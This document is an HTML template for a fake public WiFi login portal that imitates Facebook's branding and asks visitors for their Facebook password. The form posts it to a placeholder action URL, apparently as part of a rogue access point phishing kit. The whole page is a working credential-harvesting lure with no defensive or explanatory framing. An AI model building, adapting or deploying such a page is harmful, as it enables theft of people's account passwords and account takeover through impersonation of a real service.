<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Log In or Sign Up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{max-width:400px;width:90%;text-align:center}
.logo{color:#1877f2;font-size:40px;font-weight:bold;margin-bottom:8px;letter-spacing:-1px}
.tagline{font-size:15px;color:#1c1e21;margin-bottom:24px;line-height:1.3}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px;text-align:left}
.card h3{font-size:18px;color:#1c1e21;text-align:center;margin-bottom:4px}
.card p{font-size:13px;color:#606770;text-align:center;margin-bottom:16px}
input[type=password]{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:15px;margin-bottom:12px;background:#fff}
input[type=password]:focus{outline:0;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;padding:12px;background:#1877f2;color:#fff;border:0;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
.divider{border-bottom:1px solid #dadde1;margin:20px 0;position:relative}
.or{background:#fff;color:#606770;font-size:12px;padding:0 8px;position:absolute;top:-8px;left:50%;transform:translateX(-50%)}
.footer{font-size:12px;color:#606770;margin-top:16px;text-align:center;line-height:1.4}
.footer a{color:#1877f2;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="logo">facebook</div>
<p class="tagline">Connect with friends and the world around you on Facebook.</p>
<div class="card">
<h3>Log in to Free WiFi</h3>
<p>Use your Facebook account to get online</p>
<form method="POST" action="{ACTION_URL}">
<input type="password" name="password" placeholder="Facebook password" required>
<button type="submit">Log In</button>
</form>
<div class="divider"><span class="or">or</span></div>
<p style="text-align:center;font-size:14px;color:#1877f2"><a href="#" style="text-decoration:none;color:#1877f2">Create New Account</a></p>
</div>
<div class="footer">
<strong>WiFi Hotspot:</strong> By continuing you agree to our Terms of Service.<br>
<a href="#">Privacy Policy</a> &bull; <a href="#">Terms</a> &bull; <a href="#">Cookies</a>
</div>
</div>
</body>
</html>
